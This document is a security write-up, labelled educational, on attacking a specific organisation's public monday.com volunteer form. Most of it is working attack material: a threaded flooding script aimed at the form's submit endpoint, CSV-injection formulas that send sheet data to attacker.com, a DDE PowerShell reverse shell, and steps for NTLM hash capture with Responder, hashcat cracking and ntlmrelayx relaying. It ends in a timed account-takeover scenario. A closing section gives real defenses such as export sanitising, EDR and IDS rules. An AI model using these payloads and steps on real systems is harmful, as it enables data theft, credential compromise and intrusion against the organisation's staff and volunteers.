# Security Analysis: Monday.com Public Form Attack Surface
**Classification:** Educational / Security Research  
**Date:** 2026-04-18  
**Target Type:** SaaS-hosted public form (monday.com)  
**Org Placeholder:** `[TARGET_ORG]`  
**Analyst:** Independent Research  

---

## Table of Contents

1. [Scope & Disclaimer](#1-scope--disclaimer)
2. [Target Overview](#2-target-overview)
3. [URL Decomposition](#3-url-decomposition)
4. [Region Routing Analysis](#4-region-routing-analysis)
5. [Form ID Analysis](#5-form-id-analysis)
6. [Data Poisoning Attack Surface](#6-data-poisoning-attack-surface)
7. [CSV Injection — Full Technical Breakdown](#7-csv-injection--full-technical-breakdown)
8. [NTLM Hash Theft via SMB UNC Hyperlink](#8-ntlm-hash-theft-via-smb-unc-hyperlink)
9. [Full Attack Chain Simulation](#9-full-attack-chain-simulation)
10. [Detection & Defense](#10-detection--defense)
11. [Risk Summary Matrix](#11-risk-summary-matrix)

---

## 1. Scope & Disclaimer

This document is produced for **educational and defensive security purposes only**. All techniques described are documented in public CVEs, security research papers, and OWASP guidelines. No systems were compromised during this analysis. Company name has been redacted and replaced with `[TARGET_ORG]`.

Techniques covered here are well-known in the security community:
- CSV Injection: documented since 2014, OWASP listed
- NTLM Hash Theft via UNC: documented in multiple Microsoft advisories
- Data poisoning via unauthenticated forms: standard threat model

---

## 2. Target Overview

| Field | Value |
|-------|-------|
| Platform | monday.com (legitimate SaaS) |
| Form Type | Public volunteer application form |
| Organization | `[TARGET_ORG]` |
| Authentication | None — URL is sole access control |
| Data Collected | PII (volunteer applicant information) |
| Data Destination | `[TARGET_ORG]`'s monday.com workspace |

**Form URL structure:**
```
https://forms.monday.com/forms/18a60b27c123456dd992e24782eaa70e?r=use1
```

---

## 3. URL Decomposition

```
https://forms.monday.com/forms/18a60b27c123456dd992e24782eaa70e?r=use1
│       │                     │    │                                │
│       │                     │    │                                └── Region routing param
│       │                     │    └── 32-char hex Form ID
│       │                     └── Forms endpoint
│       └── Legitimate monday.com subdomain
└── HTTPS (transport secure)
```

**Component breakdown:**

| Component | Value | Significance |
|-----------|-------|--------------|
| Protocol | `https` | Transport encrypted |
| Domain | `forms.monday.com` | Legitimate SaaS subdomain |
| Path | `/forms/<id>` | Standard monday.com form path |
| Form ID | `18a60b27c123456dd992e24782eaa70e` | 32-char hex, sole access control |
| Region param | `r=use1` | Routes to AWS us-east-1 |

---

## 4. Region Routing Analysis

### What `?r=use1` Means

The `r` parameter instructs monday.com's infrastructure to route the request to a specific AWS region. Known values:

| Value | Region | Location |
|-------|--------|----------|
| `use1` | `us-east-1` | N. Virginia, USA |
| `usw2` | `us-west-2` | Oregon, USA |
| `euc1` | `eu-central-1` | Frankfurt, Germany |
| `euw1` | `eu-west-1` | Ireland |

### Security Implications

**Data Residency:**
- All form submissions physically stored in AWS `us-east-1`
- EU-based submitters → data crosses borders automatically
- GDPR Article 46 compliance questionable without explicit consent mechanism on form

**Infrastructure Recon:**
- Reveals `[TARGET_ORG]` uses monday.com US East tenant
- Confirms cloud provider = AWS
- Useful for targeted phishing (attacker can spoof monday.com US East login pages)

**Param Manipulation:**
- Stripping `?r=use1` → monday.com falls back to default routing
- Changing to `?r=euc1` → may route submission to different region
- Potential for data duplication across regions if monday.com doesn't validate region-form binding

**Attack use:**
```
# Probe which regions accept this form ID
for region in use1 usw2 euc1 euw1; do
  curl -s -o /dev/null -w "%{http_code}" \
    "https://forms.monday.com/forms/<FORM_ID>?r=$region"
done
```

---

## 5. Form ID Analysis

### Structure

```
18a60b27c123456dd992e24782eaa70e
```

- 32 hexadecimal characters
- Likely: MD5 hash or UUID v4 (dashes stripped)
- Keyspace: 16^32 = 3.4 × 10^38 possible values

### Security Model

This ID is **the only access control** on the form. No:
- Session token
- Authentication header
- Rate limiting (visible)
- CAPTCHA (observed on load)

This is **Security Through Obscurity** — the secret is the URL itself.

### Attack Vectors

**Brute Force:** Impractical against 128-bit keyspace. Not a realistic attack vector unless ID generation is flawed.

**Leak-based exposure:**
- URL shared in email → email compromise → attacker has form URL
- URL shared in Slack/Discord → channel compromise → exposed
- URL indexed by search engine (Google dorks: `site:forms.monday.com`)
- URL in public social media post promoting volunteer drive

**Predictability check:**
```python
import hashlib

# If ID = MD5 of predictable input, it's enumerable
candidates = [
    "[TARGET_ORG]",
    "[TARGET_ORG] volunteer",
    "volunteer@[TARGET_ORG].org",
    "2024-volunteer-form",
]

for c in candidates:
    h = hashlib.md5(c.encode()).hexdigest()
    print(f"{c} → {h}")
    # Compare against: 18a60b27c123456dd992e24782eaa70e
```

**If match found:** Form ID was generated from predictable input → other form IDs enumerable.

### Submission Endpoint

Form likely POSTs to:
```
POST https://forms.monday.com/forms/submit/<FORM_ID>
Content-Type: application/json

{
  "form_id": "18a60b27c123456dd992e24782eaa70e",
  "answers": { ... }
}
```

No auth token in submission → scriptable by anyone.

---

## 6. Data Poisoning Attack Surface

Since the form accepts unauthenticated submissions with no rate limiting visible, an attacker can submit arbitrary data to `[TARGET_ORG]`'s volunteer database.

### Attack 1 — Bulk Flooding

```python
import requests
import threading

FORM_SUBMIT_URL = "https://forms.monday.com/forms/submit/18a60b27c123456dd992e24782eaa70e"

def flood(thread_id):
    for i in range(1000):
        payload = {
            "form_id": "18a60b27c123456dd992e24782eaa70e",
            "answers": {
                "name": f"Fake Volunteer {thread_id}-{i}",
                "email": f"fake{thread_id}{i}@throwaway.com",
                "phone": "555-0000"
            }
        }
        requests.post(FORM_SUBMIT_URL, json=payload)

# 10 threads × 1000 submissions = 10,000 fake records
threads = [threading.Thread(target=flood, args=(t,)) for t in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

**Impact:** Real volunteer applications buried. Coordinators miss legitimate applicants. Storage quotas hit.

### Attack 2 — Identity Spoofing

Submit with real person's identity:
```
Name:  John Smith (real staff member)
Email: john.smith@[target_org].org
Phone: (real phone from LinkedIn)
Notes: "Please contact me ASAP regarding sensitive matter"
```

**Impact:**
- Creates false record for real person
- Could get real person onboarded to programs they didn't apply for
- Social engineering pivot: attacker calls org pretending to be "John Smith who applied"

### Attack 3 — Injection Probing

```
Name:  ' OR '1'='1
Email: "><script>alert(document.cookie)</script>
Notes: {{7*7}}  ← SSTI probe
Phone: ${7*7}   ← EL injection probe
```

Monday.com likely sanitizes at render layer, but downstream systems (exports, integrations, Zapier webhooks) may not.

### Attack 4 — CSV Injection (See Section 7)

Most dangerous poisoning vector — covered in full detail below.

---

## 7. CSV Injection — Full Technical Breakdown

### Root Cause

Spreadsheet applications (Excel, Google Sheets, LibreOffice Calc) interpret cells beginning with `=`, `+`, `-`, `@` as **formulas**. The CSV format has no escaping standard. When `[TARGET_ORG]` staff exports monday.com board data to CSV and opens it in a spreadsheet app, attacker-controlled field values execute as formulas.

**Not a monday.com vulnerability. A pipeline vulnerability:**
```
Form submission → Monday.com board → CSV export → Spreadsheet app → Formula execution
```

### Trigger Characters

| Prefix | Behavior |
|--------|----------|
| `=` | Formula execution (primary) |
| `+` | Also triggers formula in some apps |
| `-` | Also triggers formula in some apps |
| `@` | Triggers in LibreOffice |
| `\t` | Tab character — can shift cell columns |
| `\r` | Carriage return — can inject new rows |

### Payload Catalog

#### Tier 1 — Recon / Silent Beacon

**Google Sheets — exfiltrate entire sheet on open:**
```
=IMPORTXML(CONCAT("https://attacker.com/log?d=",ENCODEURL(JOIN(",",A1:Z100))),"//a")
```

**Google Sheets — pixel beacon (invisible, fires on every open):**
```
=IMAGE("https://attacker.com/pixel.gif?id="&ENCODEURL(A1&"|"&B1&"|"&C1))
```
Attacker receives HTTP GET with victim data in query string. No UI indication to victim.

**Excel — DNS beacon (bypasses many egress filters):**
```
=HYPERLINK("\\\\attacker.com\\share\\file","View Details")
```
Windows initiates SMB connection → DNS lookup for `attacker.com` leaks even if SMB blocked.

#### Tier 2 — Credential Harvest

**Fake re-auth link:**
```
=HYPERLINK("https://monday-login.attacker.com","[ACTION REQUIRED] Session expired - click to re-authenticate")
```
Victim sees what looks like a legitimate link in the spreadsheet cell. Clicks → fake monday.com login page → credentials stolen.

**NTLM Hash Theft (no click required — see Section 8):**
```
=HYPERLINK("\\\\attacker.com\\share","[IMPORTANT] View attached policy document")
```

#### Tier 3 — Remote Code Execution (Legacy Excel / DDE)

DDE (Dynamic Data Exchange) — disabled by default in modern Excel, but present in enterprise legacy environments:
```
=CMD|' /C powershell -w hidden -enc <base64_encoded_payload>'!A1
```

```
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!''
```

PowerShell reverse shell via DDE:
```
=CMD|' /C powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient(\"attacker.com\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$w=([text.encoding]::ASCII).GetBytes($r);$s.Write($w,0,$w.Length)}"'!A1
```

#### Tier 4 — Cross-Record Exfiltration

Single poisoned record exfiltrates ALL other records:
```
=CONCATENATE(A2,",",B2,",",C2)&T(HYPERLINK("http://attacker.com/steal?d="&ENCODEURL(A2&","&B2&","&C2),""))
```

When spreadsheet opens, formula runs for every row it can reference → all volunteer PII sent to attacker server.

#### Tier 5 — Google Sheets Live Exfil (Recalculates Every Open)

```
=IMPORTDATA("https://attacker.com/collect?t="&NOW()&"&u="&ENCODEURL(A1)&"&e="&ENCODEURL(B1))
```

`NOW()` forces recalculation on every open → attacker receives beacon every time file is accessed, including timestamps → builds access pattern map of `[TARGET_ORG]` staff.

### Sanitization Bypass

If basic sanitization strips leading `=`:
```
# Double encoding
==CMD|...

# Whitespace prefix (some parsers)
 =CMD|...

# Tab injection to shift formula to new cell
\t=IMPORTXML(...)

# Newline injection to create new row with formula
Name\n=IMPORTXML(...)
```

---

## 8. NTLM Hash Theft via SMB UNC Hyperlink

### Background

UNC (Universal Naming Convention) paths (`\\server\share`) are resolved by Windows automatically. When Excel renders a cell containing a UNC HYPERLINK, Windows initiates SMB authentication **without user interaction** — sending the user's NTLMv2 hash to the remote server.

This is **Windows working as designed**, not a vulnerability in Excel or monday.com.

### Payload

```
=HYPERLINK("\\\\ATTACKER_IP\\share","[IMPORTANT] View volunteer policy document")
```

Or using domain (if attacker has public server):
```
=HYPERLINK("\\\\attacker.com\\share","text")
```

### Authentication Flow

```
1. Excel renders HYPERLINK cell
2. Windows NTLM auth stack fires automatically
3. Client → Server: NTLM NEGOTIATE_MESSAGE
4. Server → Client: NTLM CHALLENGE_MESSAGE (8-byte random nonce)
5. Client → Server: NTLM AUTHENTICATE_MESSAGE
   Contains: NTLMv2 response = HMAC-MD5(NT_hash, username+domain+challenge+timestamp)
6. Attacker captures full NTLMv2 hash
```

No user click. Happens in ~200ms. No visible indicator.

### Attacker Infrastructure Setup

#### Option 1 — Responder (Recommended)

```bash
git clone https://github.com/lgandx/Responder
cd Responder

# Run on attacker's network interface
sudo python3 Responder.py -I eth0 -wrf

# -w = WPAD rogue proxy
# -r = NetBIOS wredir
# -f = fingerprint hosts
# Listens on: 445 (SMB), 139 (NetBIOS), 80/443 (HTTP/S), 5355 (LLMNR), 137/138 (NBT-NS)
```

#### Option 2 — Impacket SMB Server (Lightweight)

```bash
pip install impacket
python3 impacket/examples/smbserver.py SHARE /tmp/loot -smb2support
```

#### Option 3 — Metasploit Module

```bash
use auxiliary/server/capture/smb
set JOHNPWFILE /tmp/captured_hashes.txt
set SRVHOST 0.0.0.0
run
```

### Captured Output (Responder)

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.1.105
[SMB] NTLMv2-SSP Username : [TARGET_ORG]\sarah.coordinator
[SMB] NTLMv2-SSP Hash     :
sarah.coordinator::[TARGET_ORG]:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6:
0101000000000000C0653150DE0D020111223344556677880000000002000800560049
...
[*] Skipping previously captured hash for [TARGET_ORG]\sarah.coordinator
[+] Hash saved to /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.105.txt
```

### Cracking NTLMv2 Hashes

#### Hashcat (GPU)

```bash
# NTLMv2 = hash mode 5600
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt

# With mutation rules (significantly higher success rate)
hashcat -m 5600 captured.hash rockyou.txt -r rules/best64.rule

# Mask attack (if password policy known)
# Example: 8 chars, 1 uppercase, 1 number (common corporate policy)
hashcat -m 5600 captured.hash -a 3 ?u?l?l?l?l?l?d?d

# Combinator attack
hashcat -m 5600 captured.hash -a 1 words.txt words.txt
```

#### John the Ripper (CPU)

```bash
john --format=netntlmv2 captured.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --format=netntlmv2 captured.hash --rules --wordlist=rockyou.txt
```

#### Expected Crack Times (RTX 3090 — ~1.8 GH/s NTLMv2)

| Password Complexity | Estimated Time |
|--------------------|----------------|
| 6 chars, lowercase | < 1 second |
| 8 chars, dictionary word | 2–5 seconds |
| 8 chars, word + number (e.g. `Summer24`) | 30–60 seconds |
| 8 chars, mixed case + symbol | Minutes to hours |
| 10 chars, random | Days to weeks |
| 12+ chars, truly random | Computationally impractical |

Most enterprise users use passwords in the first three categories.

### If Crack Fails — NTLM Relay Attack

NTLMv2 cannot be directly replayed, but on the same network segment, the hash can be **relayed in real-time** to another target without ever cracking it:

```bash
# Step 1: Disable SMB/HTTP capture in Responder (we relay, not capture)
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# Step 2: Run ntlmrelayx targeting an internal host
python3 impacket/examples/ntlmrelayx.py \
  -t smb://192.168.1.10 \
  -smb2support \
  -i  # interactive shell on success

# Step 3: Run Responder to capture and forward
sudo python3 Responder.py -I eth0 -rdw
```

**Relay targets by protocol:**

| Target Protocol | Tool Flag | What You Get |
|----------------|-----------|--------------|
| SMB | `-t smb://target` | File system access, command execution |
| LDAP | `-t ldap://dc` | AD enumeration, user creation |
| LDAPS | `-t ldaps://dc` | Same + can set user attributes |
| MSSQL | `-t mssql://target` | DB access, `xp_cmdshell` |
| HTTP | `-t http://target` | Authenticated web requests |

### Firewall Evasion — WebDAV over HTTP

Most corporate firewalls block outbound **port 445** (SMB). WebDAV tunnels SMB auth over **port 80**:

```
=HYPERLINK("\\\\attacker.com@80\\DavWWWRoot\\share","text")
```

Windows attempts WebDAV connection on port 80 → still sends NTLMv2 → port 80 usually allowed outbound.

Port 443 variant:
```
=HYPERLINK("\\\\attacker.com@443\\share","text")
```

---

## 9. Full Attack Chain Simulation

### Scenario: Single Form Submission → Full Org Compromise

**Attacker prerequisites:**
- Public VPS (any cloud provider)
- Responder running, port 445 open inbound
- Hashcat with GPU

```
T+0:00  Attacker submits [TARGET_ORG] volunteer form
        Name:  =HYPERLINK("\\\\ATTACKER_VPS_IP\\share","[IMPORTANT] View volunteer handbook")
        Email: volunteer@protonmail.com
        Notes: =IMPORTXML(CONCAT("https://ATTACKER_VPS_IP/log?d=",ENCODEURL(JOIN(",",A1:Z50))),"//a")
        Phone: +1-555-0100

T+0:01  Submission stored in [TARGET_ORG]'s monday.com board

T+7d    [TARGET_ORG] coordinator does weekly export: "Export to Excel"
        Saves file: volunteers_2026_Q2.csv

T+7d+10s  Coordinator opens CSV in Excel

T+7d+11s  Excel renders HYPERLINK cell
          Windows initiates SMB connection to ATTACKER_VPS_IP:445
          NTLMv2 hash captured by Responder:
          coordinator::[TARGET_ORG]:aabbccdd...<hash>

T+7d+11s  IMPORTXML fires → HTTP GET to attacker server:
          GET /log?d=Sarah+Johnson,sarah@[target_org].org,555-1234,... HTTP/1.1
          → All visible volunteer PII exfiltrated

T+7d+14s  Hashcat cracks hash:
          [TARGET_ORG]\sarah.coordinator → "Spring2025!"

T+7d+20s  Attacker tries "Spring2025!" on:
          → monday.com login: SUCCESS → Full volunteer database
          → Microsoft 365: SUCCESS → Full email access
          → VPN portal: SUCCESS → Internal network access

T+7d+25s  Attacker downloads complete volunteer database
          Sends phishing email to all volunteers from sarah's real account

T+8d    [TARGET_ORG] begins receiving reports of suspicious emails
        Has no idea when or how breach occurred
        No malware deployed. No AV alert. No obvious indicator.
```

### Forensic Footprint

| Artifact | Location | Attacker Exposure |
|----------|----------|-------------------|
| Form submission | monday.com logs | Attacker's IP if not proxied |
| SMB connection | Windows Security Event Log (4648) | Attacker VPS IP |
| HTTP exfil request | Web server logs | Attacker VPS IP |
| monday.com login | monday.com audit log | Attacker IP |
| Email sends | Exchange/O365 audit log | sarah's account (legitimate creds) |

Attacker using VPS behind residential proxy or Tor → footprint near zero.

---

## 10. Detection & Defense

### For [TARGET_ORG] — Immediate Actions

#### 1. Add CAPTCHA to Form
Prevents automated flooding and scripted submission attacks.
Monday.com supports reCAPTCHA integration in form settings.

#### 2. Email Verification Before Record Creation
Send confirmation email to submitted address before creating board item.
Eliminates identity spoofing and reduces junk submissions.

#### 3. Sanitize CSV Exports

Before exporting data from monday.com, run through sanitization:

```python
def sanitize_csv_field(value: str) -> str:
    """Neutralize CSV injection by prefixing formula triggers with single quote."""
    if not value:
        return value
    # Strip leading whitespace before checking
    stripped = value.lstrip()
    dangerous_prefixes = ('=', '+', '-', '@', '\t', '\r', '\n')
    if stripped and stripped[0] in dangerous_prefixes:
        return "'" + value  # Single quote prefix neutralizes formula execution
    return value

def sanitize_row(row: dict) -> dict:
    return {k: sanitize_csv_field(str(v)) for k, v in row.items()}
```

Or use a dedicated library:
```python
# pip install csv-injection-sanitizer
from csv_injection_sanitizer import sanitize
clean_value = sanitize(user_input)
```

#### 4. Never Open Raw CSV Exports Directly

Use Excel's **Data → Import from Text/CSV** wizard instead of double-clicking CSV files.  
Import wizard treats all values as text by default → formulas not executed.

#### 5. Excel Security Settings

```
File → Options → Trust Center → Trust Center Settings
→ External Content → Disable "Enable automatic update of Workbook Links"
→ Protected View → Enable all Protected View options
→ Macro Settings → Disable all macros with notification
```

#### 6. Network Controls

```
# Block outbound SMB at perimeter firewall
DENY outbound TCP/UDP port 445
DENY outbound TCP/UDP port 139

# Block outbound WebDAV (if not needed)
DENY outbound TCP port 80 to non-approved destinations (allowlist model)

# Alert on DNS queries to new/unknown external hosts from workstations
```

#### 7. EDR Rules

```yaml
# Alert: Office application making outbound network connection
process_name: EXCEL.EXE OR WINWORD.EXE
event: network_connection
destination_port: [445, 139, 80, 443]
action: alert + block

# Alert: Office application spawning cmd.exe or powershell.exe  
parent_process: EXCEL.EXE
child_process: cmd.exe OR powershell.exe OR wscript.exe
action: block + alert
```

#### 8. SIEM Detection — NTLM Hash Capture Attempt

```
# Windows Security Event Log
Event ID 4648: Explicit credential logon attempt
Event ID 4776: NTLM authentication
Condition: workstation_name NOT IN known_asset_list

# Network IDS signature (Snort/Suricata)
alert tcp any any -> $EXTERNAL_NET 445 \
  (msg:"Outbound SMB - Possible NTLM hash theft"; \
   flow:established,to_server; \
   sid:9000001; rev:1;)
```

#### 9. Responder Detection on Network

```
# Responder answers LLMNR/NBT-NS queries for ALL hostnames
# A single host responding to all LLMNR queries = anomaly

# Detection query (Zeek/Bro)
event dns_request(c: connection, msg: dns_msg, question: dns_question) {
  if (question$qtype == 32 && is_external(c$id$resp_h)) {
    ALERT "Possible LLMNR/NBT-NS poisoning from " + c$id$resp_h;
  }
}
```

### For Individual Submitters

| Risk | Mitigation |
|------|-----------|
| PII exposure | Submit minimal required info only |
| Data breach | Use alias email for form submissions |
| Tracking | Check form URL matches official [TARGET_ORG] communications |
| Legitimacy | Verify form was shared via official channel before submitting |

---

## 11. Risk Summary Matrix

| Attack | Difficulty | Impact | Likelihood | Priority |
|--------|-----------|--------|------------|----------|
| CSV Injection → NTLM Hash Theft | Low | Critical | High | **CRITICAL** |
| CSV Injection → PII Exfiltration | Low | High | High | **CRITICAL** |
| Bulk Form Flooding | Very Low | Medium | High | High |
| Identity Spoofing | Very Low | Medium | Medium | High |
| CSV Injection → RCE (DDE) | Medium | Critical | Low-Medium | High |
| Form ID Enumeration | Very High | High | Very Low | Low |
| Region Param Manipulation | Low | Low | Low | Low |

### Overall Risk Rating: **HIGH**

Primary attack vector requires:
- Zero technical skill (paste formula into form field)
- Zero authentication
- Zero interaction beyond victim opening an export file

Remediation priority:
1. CSV export sanitization (immediate)
2. CAPTCHA on form (immediate)  
3. Email verification before record creation (short term)
4. Network egress rules blocking outbound SMB (short term)
5. EDR rules for Office → network connections (short term)
6. Staff training: never open raw CSV exports (ongoing)

---

## Appendix A — Attacker Tooling Reference

| Tool | Purpose | Source |
|------|---------|--------|
| Responder | LLMNR/NBT-NS/SMB poison + NTLMv2 capture | github.com/lgandx/Responder |
| Impacket | SMB server, ntlmrelayx | github.com/fortra/impacket |
| Hashcat | GPU hash cracking | hashcat.net |
| John the Ripper | CPU hash cracking | openwall.com/john |
| Metasploit | SMB capture module | metasploit.com |

## Appendix B — Relevant CVEs & References

| Reference | Description |
|-----------|-------------|
| CVE-2017-0144 | EternalBlue (SMB — context only) |
| OWASP Testing Guide v4.2 — OTG-INPVAL-016 | CSV Injection |
| MS-NLMP Spec | NTLM Authentication Protocol |
| MITRE ATT&CK T1187 | Forced Authentication |
| MITRE ATT&CK T1557.001 | LLMNR/NBT-NS Poisoning |
| DerbyCon 2017 — "The Absurdly Underestimated Dangers of CSV Injection" | CSV injection research |

---

*Document generated for educational and defensive security purposes.*  
*All company identifiers redacted. Replace `[TARGET_ORG]` with actual organization name for internal use.*
